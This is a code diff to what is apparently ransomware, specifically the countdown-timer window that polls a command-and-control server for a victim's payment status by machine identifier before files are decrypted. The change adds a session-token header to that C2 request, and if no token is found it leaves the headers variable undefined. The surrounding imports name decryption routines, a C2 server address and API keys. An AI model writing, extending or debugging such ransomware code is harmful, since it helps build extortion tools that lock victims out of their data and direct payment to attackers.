@@ -8,6 +8,7 @@ import requests
 from datetime import datetime, timedelta
 from Decrypt import decrypt_all_files
 from RSA_Key_Handling import get_machine_identifier
+from Session_Handling import read_session_token
 from Variables import script_files, seconds_left, password, timer_file_name, c2_server, api_key, wrong_api_key
 
 ####################################################################################################################
@@ -66,9 +67,14 @@ def timer_window():
 
     def check_payment_status():
         unique_id = get_machine_identifier()
-        headers = {
-        'API-KEY': api_key,
-        }
+        session_token = read_session_token()
+        if session_token:
+            headers = {
+            'API-KEY': api_key,
+            'Session-Token' : session_token
+            }
+        else:
+            print("No session token") # Debug Message
         try:
             response = requests.get(c2_server + f"/payment_status/{unique_id}_private.pem", headers=headers)
             if response.status_code == 200:
